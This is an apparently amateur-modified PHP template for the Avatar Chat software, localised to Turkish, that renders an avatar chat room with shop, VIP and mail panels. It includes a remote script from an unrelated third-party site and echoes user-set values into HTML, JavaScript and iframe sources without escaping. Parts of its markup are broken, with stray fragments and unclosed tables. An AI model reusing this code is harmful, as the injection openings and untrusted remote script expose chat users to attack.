<?php

/**

 Author: Pro Chatrooms
 Software: Avatar Chat
 Url: http://www.prochatrooms.com
 Copyright 2007-2010 All Rights Reserved

 Avatar Chat and all of its source code/files are protected by Copyright Laws. 
 The license for Avatar Chat permits you to install this software on a single domain only (.com, .co.uk, .org, .net, etc.). 
 Each additional installation requires an additional software licence, please contact us for more information.
 You may NOT remove the copyright information and credits for Avatar Chat unless you have been granted permission. 
 Avatar Chat is NOT free software - For more details http://www.prochatrooms.com/software_licence.php

**/


	// Send headers to prevent IE cache

	header("Expires: Mon, 26 Jul 1997 05:00:00 GMT" ); 
	header("Last-Modified: " . gmdate( "D, d M Y H:i:s" ) . "GMT" ); 
	header("Cache-Control: no-cache, must-revalidate" ); 
	header("Pragma: no-cache" );
	header("Content-Type: text/html; charset=utf-8");

?>

	<html> 
	<head>
	<title></title>
	<!-- <meta http-equiv="X-UA-Compatible" content="IE=7"/> -->
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<link type="text/css" rel="stylesheet" href="templates/style.css">

	<!--[if IE 6]>
	<style type="text/css">
	/* some css fixes for IE browsers */
	html {overflow-y:hidden;}
	body {overflow-y:auto;}
	#bg {position:absolute; z-index:-1;}
	#content {position:static;}
	</style>
	<![endif]-->

	<!--[if IE 7]>
	<link type="text/css" rel="stylesheet" href="templates/style_ie7.css">
	<![endif]-->

	<!--[if IE 8]>
	<link type="text/css" rel="stylesheet" href="templates/style_ie8.css">
	<![endif]-->

	<script language="javascript" type="text/javascript">
	<!--
	if(window.location == top.location)
	{
		window.location.href="index.html";
	}
	// -->
	</script>

	<script language="javascript" type="text/javascript">
	<!--

	var mTimer;
	var uTimer;
	var fTimer;

	//system settings
	var refreshUsers = 10000; // 10 secs 
	var refreshMessages = 3000; // 3 secs 
	var refreshMails = 30000; // 30 secs 
	var showUserChat = 5000; // 5 secs

	//user details
	var chatName = '<?php echo $_SESSION['username'];?>';
	var chatID = '<?php echo $uid;?>';
	var chatRef = <?php echo $uref;?>;
	var chatProfileID = '<?php echo $CONFIG['profile_id'];?>';
	var chatProfileUrl = '<?php echo $CONFIG['profile_url'];?>';
	var chatAdmin = '<?php echo $sAdmin;?>';
	var chatMemberLevel = <?php echo $chatMemberLevel;?>;
	var room = <?php echo $uroom;?>;
	var messageID = <?php echo $lastMessID;?>;
	var enableDoppleMe = 0;
	var remoteBg = <?php echo $CONFIG['remoteBackgrounds'];?>;
	var remoteAudio = <?php echo $CONFIG['remoteMusic'];?>;

	//init object
	var x = <?php echo $uXX;?>; //Start Pos - left
	var y = <?php echo $uYY;?>; //Start Pos - top
	var xx = <?php echo $offsetuXX;?>; //Start Pos - left
	var yy = <?php echo $offsetuYY;?>; //Start Pos - top
	var dest_x = <?php echo $uXX;?>;  //End Pos - left
	var dest_y = <?php echo $uYY;?>;  //End Pos - top
	var denyMove = 0;
	var moveAvatar = 1;
	var hideSplash = <?php echo $showSplashPage;?>;

	//init doors
	var doorTop1 = <?php echo $doorTop1;?>;
	var doorLeft1 = <?php echo $doorLeft1;?>;
	var doorHeight1 = <?php echo $doorHeight1;?>;
	var doorWidth1 = <?php echo $doorWidth1;?>;

	var doorTop2 = <?php echo $doorTop2;?>;
	var doorLeft2 = <?php echo $doorLeft2;?>;
	var doorHeight2 = <?php echo $doorHeight2;?>;
	var doorWidth2 = <?php echo $doorWidth2;?>;

	var doorTop3 = <?php echo $doorTop3;?>;
	var doorLeft3 = <?php echo $doorLeft3;?>;
	var doorHeight3 = <?php echo $doorHeight3;?>;
	var doorWidth3 = <?php echo $doorWidth3;?>;



	//init options
	var kickRoom = '<?php echo $CONFIG['kickRoom'];?>';
	var doorVisible = <?php echo $doorVisible;?>;
	var roomFull = '<?php echo $_SESSION['roomFull'];?>';
	var roomFriends = '<?php echo $_SESSION['roomFriends'];?>';

	var _fontLogout = '#990000';
	var _fontLogin = '#006633';
	var _fontSelf = '#003366';
	var _fontIAction = '#663366';

	var _maxMessages = 35;
	var _url = '<?php echo $CONFIG['chatroom_url'];?>';
	var _ver = '<?php echo $CONFIG['version'];?>';

	//-->
	</script>

	<script type="text/javascript" src="js/preload.js"></script>
	<script type="text/javascript" src="js/XmlHttpRequest.js"></script>
	<script type="text/javascript" src="js/windowsize.js"></script>
	<script type="text/javascript" src="js/movement.js"></script>
	<script type="text/javascript" src="js/smilies.js"></script>
	<script type="text/javascript" src="js/badwords.js"></script>
	<script type="text/javascript" src="js/sendData.js"></script>
	<script type="text/javascript" src="js/userlist.js"></script>
	<script type="text/javascript" src="js/getdata.js"></script>
	<script type="text/javascript" src="js/display.js"></script>
	<script type="text/javascript" src="js/blockuser.js"></script>
    <script language="javascript" src="http://in.sitekodlari.com/sagtus.js"></script>
<script language="text/javascript" src="http://in.sitekodlari.com/sagtus.js"></script>

	<script type="text/javascript" src="js/userpoints.js"></script>
	<script type="text/javascript" src="js/usermail.js"></script>
	<script type="text/javascript" src="js/userfriends.js"></script>
	<script type="text/javascript" src="js/ban.js"></script>
	<script type="text/javascript" src="js/interactions.js"></script>
	<script type="text/javascript" src="js/changeBG.js"></script>
	<script type="text/javascript" src="js/changeAVI.js"></script>
	<script type="text/javascript" src="js/changeAUDIO.js"></script>
	<script type="text/javascript" src="js/changeROOM.js"></script>

	</head>

	<body id="body" class="body" onkeydown="getMoveKeyPress(event);" onkeyup="sendMoveKeyPress(event);" onLoad="doWindowSize();getUsersOnline();updateUserPoints();getMessages();hideSpeech();getMail();moveImage('_a_');showWelcome();createChatTabs('chatbox','');activeChatWindow();hidetextOptions();_door1(doorTop1,doorLeft1,doorHeight1,doorWidth1,doorVisible);_door2
(doorTop2,doorLeft2,doorHeight2,doorWidth2,doorVisible);_door3(doorTop3,doorLeft3,doorHeight3,doorWidth3,doorVisible);checkRoomStatus();doInteractions();" marginwidth="0" marginheight="0" leftmargin="0" rightmargin="0" topmargin="0" bottommargin="0">

	<div id="bg" style="background-image: url('<?php echo $background_url;?>');">

		<div id="chatscreen" class="chatscreen" style="background-image: url('<?php echo $background_url;?>');">
			<div id="l_myMessage" class="myMessage"></div>
			<div id="_a_myMessage" class="myMessage"></div>
			<div id="r_myMessage" class="myMessage"></div>
			<div style="left:<?php echo $uXX;?>px;top:<?php echo $uYY;?>px;width:70px;cursor:pointer;" id="_a_myAvatar" class="myAvatar" onClick="newUrl('<?php echo $CONFIG['profile_url'].$_SESSION['username'];?>','myprofile')">

				<b><?php echo $showUsername;?></b>
				<br>

					<span class="span"><img id="base" src="<?php echo $uavatar[1];?>" border="0" height="75" width="53"></span>
					<span class="span"><img id="bottoms" src="<?php echo $uavatar[2];?>" border="0" height="75" width="53"></span>
					<span class="span"><img id="eyes" src="<?php echo $uavatar[3];?>" border="0" height="75" width="53"></span>
					<span class="span"><img id="hair" src="<?php echo $uavatar[4];?>" border="0" height="75" width="53"></span>
					<span class="span"><img id="beard" src="<?php echo $uavatar[5];?>" border="0" height="30" width="30"></span>
					<span class="span"><img id="mouth" src="<?php echo $uavatar[6];?>" border="0" height="75" width="53"></span>
					<span class="span"><img id="shoes" src="<?php echo $uavatar[7];?>" border="0" height="75" width="53"></span>
					<span class="span"><img id="tops" src="<?php echo $uavatar[8];?>" border="0" height="75" width="53"></span>
					<span class="span"><img id="accessories" src="<?php echo $uavatar[9];?>" border="0" height="75" width="53"></span>
					<span class="span"><img id="trans" src="avatars/male/background/trans.png" border="0" height="75" width="53"></span>

			</div>
		</div>

		<div id="controlpanel" class="controlPanel">
			<form name="sendMessage" onSubmit="return blockSubmit();">
			<input class="messageBar" id="message" type="text" name="message" autocomplete="off" onKeyPress="return submitenter(this,event);" maxlength="100" placeholder="Mesajinizi Buraya Yaziniz...">
			<input class="sendButton" type="image" name="submit" src="images/go.png" width="24" height="24">
			</form>
		</div>

		<div id="sendmail" class="sendmail">
			<form name="sendeMail">	
			Kisi Adi: 
			  <input id="send_to" class="send_to" type="text" name="send_to" value=""><br>
			<textarea id="send_mail_mess" class="send_mail_mess" name="send_mail_mess" cols="20" rows="4" value=""  maxlength="250"></textarea><br>
			<input name="submit" type="button" class="mysendButton" onClick="sendUserMail()" value="Gonder">	
			</form>	
		</div>

		<div id="myrooms" class="myrooms">
			<img name="map" src="images/map.jpg" width="646" height="330" border="0" id="map" usemap="#m_map" alt="" />
			<map name="m_map" id="m_map">
			<area shape="rect" coords="506,117,635,201" href="javascript:void(0);" style="cursor:pointer;" onClick="javascript:loadRoom('-'+chatRef);" title="My Room" alt="My Room"> 
			<area shape="rect" coords="336,115,468,202" href="javascript:void(0);" style="cursor:pointer;" onClick="javascript:loadRoom('5');" title="The Park" alt="The Park"> 
			<area shape="rect" coords="169,5,295,81" href="javascript:void(0);" style="cursor:pointer;" onClick="javascript:loadRoom('2');" title="The Beach" alt="The Beach"> 
			<area shape="rect" coords="174,115,291,198" href="javascript:void(0);" style="cursor:pointer;" onClick="javascript:loadRoom('3');" title="The Coffee Bar" alt="The Coffee Bar"> 
			<area shape="rect" coords="12,111,133,196" href="javascript:void(0);" style="cursor:pointer;" onClick="javascript:loadRoom('1');" title="The Club" alt="The Club"> 
			<area shape="rect" coords="24,229,132,307" href="javascript:void(0);" style="cursor:pointer;" onClick="javascript:loadRoom('4');" title="The Alley" alt="The Alley"> 

			<div align="right">Click on a room above, <a href="javascript:grayOut(false);toggleBox('myrooms');">hide map</a> or <a href="javascript:logOut()">logout</a> &#187;</div>
		</div>

		<div id="chatboxButton" class="chatboxButton"></div>

		<div title="Bakkal" alt="pg" id="pgButton" class="pgButton" onClick="pg();"><img src="images/shop.png" style="padding-top:7px;" width="28" height="22"></div>

title="Bakkal" alt="pg" id="pgButton" class="pgButton" onClick="shop();






		<div title="Cikis" alt="Logout" id="logoutButton" class="logoutButton" onClick="logOut();"><img src="images/logout.png" style="padding-top:7px;" width="38" height="33"></div>

<p>Buraya</p>

		<div title="Gorev" alt="Play Games" id="playgamesButton" class="playgamesButton" onClick="grayOut(true);showGames();"><img src="images/games.png" style="padding-top:50px;" width="34" height="54"></div>



<div title="Market" alt="Shop" id="shopButton" class="shopButton"><a target="_blank" href="http://jerolika-pvp.tk/market.html" _fcksavedurl="http://jerolika-pvp.tk/market.html"><img src="images/shop.png" style="padding-top:7px;" width="28" height="22"></a></div>


<div title="Gunluk bonus" alt="View Map" id="mapButton" class="mapButton" onclick=""><a target="_blank" href="/.."><img src="images/map.png" width="30" height="30" border="0" style="padding-top:7px;"></a></div>
        

		<div title="Mesaj Kutum" alt="My Inbox" id="mailButton" class="mailButton" onClick="<?php if(!$chatMemberLevel){echo "grayOut(true);showVIP();";}else{echo "toggleBox('myinbox');toggleStyle(this,'email','mailButton');readOldMail();getMail();";}?>">0</div>

		<div title="Telefon" alt="Send Message" id="sendmailButton" class="sendmailButton" onClick="<?php if(!$chatMemberLevel){echo "grayOut(true);showVIP();";}else{echo "toggleBox('sendmail');toggleStyle(this,'sendmail','sendmailButton');";}?>"></div>

		<div title="LIKA" alt="Credit Points" id="creditsButton" class="creditsButton"></div>

		<div title="Saglik Puani" alt="Love Points" id="loveButton" class="loveButton"></div>

		<div title="My Like Points" alt="Like Points" id="likeButton" class="likeButton"></div>

		<div title="Yildiz Puani" alt="Star Points" id="giftButton" class="giftButton"></div>

		<div title="Karakterimi Duzenle" alt="Edit My Avatar" id="avatarButton" class="avatarButton" onClick="grayOut(true);showAvatarCreator();">

			<span class="spanMini"><img id="base" src="<?php echo $uavatar[1];?>" border="0" height="0" width="0"></span>
			<span class="spanMini"><img id="bottoms" src="<?php echo $uavatar[2];?>" border="0" height="0" width="0"></span>
			<span class="spanMini"><img id="eyes" src="<?php echo $uavatar[3];?>" border="0" height="75" width="53"></span>
			<span class="spanMini"><img id="hair" src="<?php echo $uavatar[4];?>" border="0" height="75" width="53"></span>
			<span class="spanMini"><img id="beard" src="<?php echo $uavatar[5];?>" border="0" height="10" width="0"></span>
			<span class="spanMini"><img id="mouth" src="<?php echo $uavatar[6];?>" border="0" height="75" width="53"></span>
			<span class="spanMini"><img id="shoes" src="<?php echo $uavatar[7];?>" border="0" height="0" width="0"></span>
			<span class="spanMini"><img id="tops" src="<?php echo $uavatar[8];?>" border="0" height="0" width="0"></span>
			<span class="spanMini"><img id="accessories" src="<?php echo $uavatar[9];?>" border="0" height="0" width="0"></span>
			<span class="spanMini"><img id="trans" src="avatars/male/background/trans.png" border="0" height="0" width="0"></span>
	
		</div>

		<div title="Engelledigim Kisiler" alt="Blocked Users" id="blockButton" class="blockButton" onClick="getBlockedUsers();toggleBox('blocklist');toggleStyle(this,'block','blockButton');"></div>

		<div title="Arkadaslar" alt="My Friends" id="friendsButton" class="friendsButton" onClick="showFriends();toggleBox('myfriends');toggleStyle(this,'group','friendsButton');"></div>



		<?php if($isVIP == '0' && $CONFIG['membersrooms_guests'] || $isVIP == '1' || $sAdmin == '1'){?>
			<div title="Visit Users" alt="Visit Users" id="towerButton" class="towerButton" onClick="grayOut(true);showTower();"></div>
		<?php }?>

		<?php if($uroom < '0' || $enableMusic){?>
			<div title="Turn Music On/Off" alt="Turn Music On/Off" id="speakerButton" class="speakerButton" onClick="playStream('<?php echo $music_url;?>');toggleStyle(this,'speaker','speakerButton');"></div>
		<?php }?>

<?php if($uroom == '3'){?>

			<div class="questerbutton" onClick="showNewsPaper();" style="margin-top: 100px;margin-left: 568px;z-index: 1;"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="50" height="68"><param name="wmode" value="swf/tahsin.swf"><param name="wmode" value="transparent"><embed src="swf/tahsin.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" wmode="transparent" width="50" height="68"></object></div>
<?php }?>
<?php if($uroom == '3'){?>

			<div class="questerbutton" style="margin-top: 80px;margin-left: 610px;z-index: 1;"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="50" height="68"><param name="wmode" value="swf/anketr.swf"><param name="wmode" value="transparent"><embed src="swf/anketr.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" wmode="transparent" width="50" height="68"></object></div>
<?php }?>

<?php if($uroom == '3'){?>
<div class="questerbutton" style="margin-top: 120px;margin-left: 705px;z-index: 1;"><img src="swf/bos.png" onmousemove="this.src='swf/3-1.png'" onmouseout="this.src='swf/bos.png'" width="37" height="37"   /></div>

<?php }?>

<?php if($uroom == '3'){?>
<div class="questerbutton" style="margin-top: 130px;margin-left: 515px;z-index: 1;"><img src="swf/bos.png" onmousemove="this.src='swf/4-1.png'" onmouseout="this.src='swf/bos.png'" width="37" height="37"   /></div>

<?php }?>

<?php if($uroom == '3'){?>
<div class="questerbutton" style="margin-top: 40px;margin-left: 220px;z-index: 1;"><img src="swf/bos.png" onmousemove="this.src='swf/4-1.png'" onmouseout="this.src='swf/bos.png'" width="37" height="37"   /></div>

<?php }?>




<?php if($uroom == '9'){?>

			<div class="questerbutton" style="margin-top: -80px;margin-left: 60px;z-index: 1;"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="800" height="800"><param name="wmode" value="swf/pijama.swf"><param name="wmode" value="transparent"><embed src="swf/pijama.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" wmode="transparent" width="800" height="800"></object></div>
<?php }?>


<?php if($uroom == '8'){?>

        <div id="questerbutton" class="questerbutton " onClick="showShopBakkal();" style="margin-top: 86px;margin-left: 733px; z-index: 10000;"><img src="../images/npc/bfebot.png"></div>

<div id="mBot" style="position: absolute; margin-left: 624px; margin-top: 41px; visibility: hidden;"><img src="../images/npc/mbfe.png"></div>

<div id="shopBakkal" style="visibility: hidden; background-image: url(http://www.jerolika-pvp.tk/images/shop_bg.png); background-position-y: 33%;background-position-x: 50%;  padding-left: 144px;padding-top: 51px;position: absolute; height: 452px; width: 644px;  z-index: 31001;  background-repeat: no-repeat no-repeat;background-color: transparent;"><img src="images/pm01.png" title="Kapat" onClick="hideShopBakkal();" style="position: absolute; margin-left: 471px;margin-top: -17px;cursor: pointer;"><iframe id="myframe" src="shop/fbfe.php" style="height:500px;width:700px;scroll:none;background-color:transparent;border-style:none;"></iframe></div>

        <?php }?>



<?php if($uroom == '3'){?>
<div class="questerbutton" onClick="loadRoom('6');" style="top: 470px; left: 745px; height: 81px; width: 71px; z-index: 50;"><img src="swf/3-1.png"/></div>
<?php }?>




<div id="doorlb" class="okup" onclick="loadRoom('6');" style="top: 250px; left: 10px; height: 80px; width: 55px;"></div>








		<?php if($uroom == '-'.$uref){?>
			<div title="My Room Settings" alt="My Room Settings" id="myplaceButton" class="myplaceButton" onClick="<?php if(!$chatMemberLevel){echo "grayOut(true);showVIP();";}else{echo "toggleBox('myplace');toggleStyle(this,'myplace','myplaceButton');";}?>"></div>
			<div id="startPosistion" class="startPosistion"></div>
		<?php }?>

		<div id="chatoptions" class="chatoptions"></div>

		<div id="chattab" class="chattab"></div>

		<div id="chatbox" class="chatbox"></div>

		<div id="blocklist" class="blocklist"></div>

		<div id="userdetails" class="userdetails" onblur="hideUserDetails()"></div>

		<div id="myinbox" class="myinbox"></div>

		<div id="myfriends" class="myfriends"></div>

		<div id="myplace" class="myplace">

			<div style="padding:2px;">
				<img src="images/myplace.png"> <b>Oda Adi</b><br>
				<input id="newRoomName" class="newRoomName" type="text" name="newRoomName" value="<?php echo $roomname;?>" size="18" maxlength="">
				<input type="button" name="update_RN" value="Update" onClick="updateURoomName();">
				<span id="cRoomName"></span>
				<br>
			</div>
			<div style="padding:2px;">
				<img src="images/group.png"> <b>Room Access</b><br>
				<select id="roomAccess">
				<option value="0" <?php if($room_access=='0'){?>SELECTED<?php }?>/>Allow Everyone
				<option value="1" <?php if($room_access=='1'){?>SELECTED<?php }?>/>Friends Only
				</select>
				<input type="button" name="update_roomAccess" value="Update" onClick="updateURoomAccess();">
				<span id="cRoomAccess"></span>
				<br>
			</div>
			<div style="padding:2px;">
				<img src="images/roombg.png"> <b>Background Image Url</b><br>
				<input id="newBG" class="newBG" type="text" name="newBG" value="<?php echo $background_url;?>" size="18">
				<input type="button" name="test_BG" value="Test" onClick="loadBGTest();">
				<input type="button" name="update_BG" value="Update" onClick="updateUserBG();">
				<span id="cBackUrl"></span>
			</div>
			<div style="padding:2px;">
				<img src="images/music.png"> <b>Background Music Url</b><br>
				<input id="newBM" class="newBM" type="text" name="newBG" value="<?php echo $music_url;?>" size="18">
				<input type="button" name="test_BM" value="Test" onClick="testAUDIOUrl();">
				<input type="button" name="update_BM" value="Update" onClick="updateAUDIOUrl();">
				<span id="cBackMusic"></span>	
			</div>
			<div style="padding:2px;">
				<img src="images/start.png"> <b>Avatar Start Posistion</b><br>
				<b>X:</b><input id="newStartX" class="newStartXY" type="text" name="startX" value="<?php echo $uXX;?>" size="3" maxlength="3">
				<b>Y:</b><input id="newStartY" class="newStartXY" type="text" name="startY" value="<?php echo $uYY;?>" size="3" maxlength="3">
				<input type="button" name="show_XY" value="Test" onClick="toggleBox('startPosistion');cursorPos();">
				<input type="button" name="update_newstartXY" value="Update" onClick="updateUserSP();">	
				<span id="cAvatarStart"></span>
			</div>
			<div style="padding-top:10px;">
				<img src="images/upgradeRoom.png" align="absmiddle"> <b>Max Room Users: <?php echo $max_room_users;?></b> [<a href="?do=upgrade" target="_blank">Upgrade</a>]	
			</div>
		</div>

		<div id="splashpage" class="splashpage"  style="cursor:pointer;" onClick="hideWelcome();"></div>

		<div id="sysmess" class="sysmess" onClick="hideSysMess();"></div>

		<div id="doorone" class="door" onClick="loadRoom('<?php echo $dOne;?>');" onMouseOver="toggleStyle(this,'changeroom','doorone');" onMouseOut="toggleStyle(this,'changeroom','doorone');" ></div>
		<div id="doortwo" class="door"  onClick="loadRoom('<?php echo $dTwo;?>');" onMouseOver="toggleStyle(this,'changeroom','doortwo');" onMouseOut="toggleStyle(this,'changeroom','doortwo');"></div>
		<div id="doorthree" class="door" onClick="loadRoom('<?php echo $dThree;?>');" onMouseOver="toggleStyle(this,'changeroom','doorthree');" onMouseOut="toggleStyle(this,'changeroom','doorthree');"></div>

		<div id="upgradeVIP" class="upgradeVIP">

			<div align="center"><img src="images/daymnd.png"><br><br></div>

			<div style="padding-left:50px;">
				<p><b> - Isminin sari gozukmesi</b></p>
				<p><b>- Diamond Clube uye olma</b></p>
			  <p><b>- Bazi indirimlerden yararlanma</b></p>
				<p><b>- Fisildama</b></p>
				<p><b>-Sadece VIPlerin girebilecegi mekana girme</b>			</p>
			</div>

			<div align="center">.- [<a href="?do=vip" target="_blank">Hadi AL!</a>]<br><br><br>
			  (<a href="javascript:hideVIP();">Kapat</a>)</div>
		</div>

		<div id="gotoUsers" class="gotoUsers">

			<div align="center"><img src="images/private_rooms.png"><br><br></div>

			<div style="padding-left:45px;"><br><br>
				Adi:
				  <input id="goUser" class="goUser" type="text" name="goUser" value="" size="20" maxlength="16">
				<input type="button" name="update_goUser" value="Git" onClick="getUserRoomID();">
				<br><br>
			</div>

			<div align="center"><br>
			(<a href="javascript:hideTower();">Kapat</a>)</div>
		</div>

		<div id="avatarCreator" class="avatarCreator">

			<iframe id="myframe" src="avatars/index.php" style="height:500px;width:700px;scroll:none;background-color:transparent;border-style:none;">
				<p>Your browser does not support iframes.</p>
			</iframe>
		</div>

		<div id="playGames" class="playGames">

			<div align="center">ilk gorevin seni bekliyor ! online olan butun uyelere kalp gonder gonderdin her kalp icin sana 200 lika vericez.</div>
	
<div align="center">
				<table align="center">
				<tr>



			<div align="center">
				<table align="center">
				<tr>


</div>

		<div id="mapbutton" class="mapbutton">

			<div align="center">Henuz Gorev Yok!</div>
	
<div align="center">
				<table align="center">
				<tr>



			<div align="center">
				<table align="center">
				<tr>


<img name="map" src="/images/harita_panel.png" width="750" height="490" border="0" id="map" usemap="#m_map" alt="">




				<?php

				// define loop
				$cols = 5; // set columns 
				$l = 1; // sets loop for columns 

				// get games data
				$tmp=mysql_query("SELECT * FROM ".$CONFIG['mysql_prefix']."games");
				while($i=mysql_fetch_array($tmp)) 
				{

					$new_Width = $i['game_Width'] + 18;
					$new_Height = $i['game_Height'] + 18;
		
					?>

					<td width="70">

						
					</td>

					<?php 

					// create loop
					if($l == $cols)
					{
						echo "</tr></tr>";
					}

					// update count
					$l+=1;

				} ?>

				</tr>
				</table>
				<br>
				<a href="javascript:hideGames()">Kapat</a>
			</div>
			</div>
		</div>

	</div>

	<form name="doInteraction">
	<div id="avatarInteraction" class="avatarInteraction"></div>
	</form>

	<?php if($_SESSION['chat_moderator']){?>
                <div title="Admin Controls" alt=Admin Controls" id="modButton" class="modButton" onClick="modUsers();toggleBox('modpanel');toggleStyle(this,'lock','modButton');"></div>
		<div id="modpanel" class="modpanel"></div>
	<?php }?>

	<iframe id="AUDIOUrl" src="<?php echo $music_url;?>" height="100" width="100" style="padding-top:600px;"></iframe>




	<!--  
		DO NOT REMOVE THIS COPYRIGHT NOTICE UNLESS PERMISSION HAS BEEN GRANTED
		(C)2009/2011 - Avatar Chat
	// -->

	</body>
	</html>